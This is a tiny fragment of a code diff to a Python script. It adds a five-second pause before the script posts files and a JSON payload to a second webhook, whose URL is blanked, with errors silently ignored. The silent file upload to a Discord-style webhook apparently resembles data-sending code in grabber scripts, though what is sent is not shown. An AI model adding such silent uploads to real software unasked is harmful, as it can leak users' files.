@@ -451,6 +451,8 @@ try:
 except:
     pass
 
+time.sleep(5)
+
 webhook2 = "~~"
 try:
     response = requests.post(webhook2, files=files, data={"payload_json": json.dumps(payload)})
